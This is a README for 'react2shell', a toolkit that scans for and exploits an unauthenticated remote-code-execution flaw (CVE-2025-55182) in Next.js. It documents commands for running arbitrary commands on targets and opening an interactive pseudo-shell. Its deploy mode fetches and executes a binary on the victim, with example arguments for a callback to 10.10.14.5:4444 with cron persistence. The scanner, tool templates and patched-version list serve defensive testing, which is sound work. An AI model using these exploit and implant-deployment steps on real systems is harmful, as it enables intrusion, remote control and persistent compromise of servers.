# react2shell

CVE-2025-55182 toolkit. Scanner + exploit for unauthenticated RCE in Next.js via RSC payload injection.

Node.js exploit: zero dependencies.
Bash scanner: checks single URLs or bulk lists.

## Exploit

```bash
# Single command with output
./react2shell.mjs -t http://target:3000 -c "id"

# Interactive pseudo-shell
./react2shell.mjs -t http://target:3000 -i

# Deploy a binary to the target (download + chmod + execute detached)
./react2shell.mjs -t http://target:3000 \
  --deploy ./my-agent \
  --remote-args "-H 10.10.14.5 -p 4444 --tls --cron"
```

```
Options:
  -t, --target <url>       Target URL (required)
  -c, --command <cmd>      Execute command with output
  --blind                  Blind RCE (no output capture)
  -i, --interactive        Interactive pseudo-shell
  --deploy <binary>        Upload and execute a binary on the target
  --lhost <ip>             Your IP (auto-detected if omitted)
  --serve-port <port>      HTTP port to serve the binary (default: 8888)
  --remote-args <args>     Arguments passed to the deployed binary
```

`--deploy` chains four RCE calls: platform detection (`uname`), binary download (spins up
a temp HTTP server, uses `curl`/`wget` on target), and a detached `spawn` so the process
survives the 5-second `execSync` timeout.

> **Note:** The target page must be dynamic (`force-dynamic` or a non-cacheable route).
> Static/prerendered pages return cached digests instead of executing the payload.

## Scanner

```bash
chmod +x cve-2025-55182-check.sh

# Scan a single URL
./cve-2025-55182-check.sh https://example.com

# Scan multiple URLs
./cve-2025-55182-check.sh -f urls.txt

# JSON output
./cve-2025-55182-check.sh --json https://example.com
```

```
Options:
  -f, --file FILE         Read URLs from file (one per line)
  -v, --verbose           Verbose output (show curl details)
  -q, --quiet             Quiet mode (only show vulnerable sites)
  -n, --no-follow         Don't follow redirects
  -t, --timeout SECONDS   Request timeout (default: 10)
  --json                  Output results in JSON format
  --validate-fix          Test for mitigation controls
  --single-payload        Use only the basic payload (faster)
```

## Integration templates

Templates for security tools in `templates/`:
- Nuclei (`templates/nuclei.yaml`)
- Burp Suite (`templates/burp-scanner.json`)
- OWASP ZAP (`templates/zap-scan-policy.xml`)

## Affected versions

**React:** 19.0.0, 19.1.0, 19.1.1, 19.2.0
**Next.js:** >=14.3.0-canary.77, all 15.x and 16.x (before patches)

**Patched:**
React 19.0.1+, 19.1.2+, 19.2.1+
Next.js 16.0.7+, 15.5.7+, 15.4.8+, 15.3.6+, 15.2.6+, 15.1.9+, 15.0.5+

## Technical details

See [TECHNICAL.md](TECHNICAL.md) for the full exploit chain analysis.

## References

- **CVE:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55182
- **React Advisory:** https://react.dev/blog/2025/12/03/critical-security-vulnerability
- **Fix Commit:** https://github.com/facebook/react/commit/7dc903cd29

## License

MIT

## Author

Allan Kimmer Jensen - https://akj.io
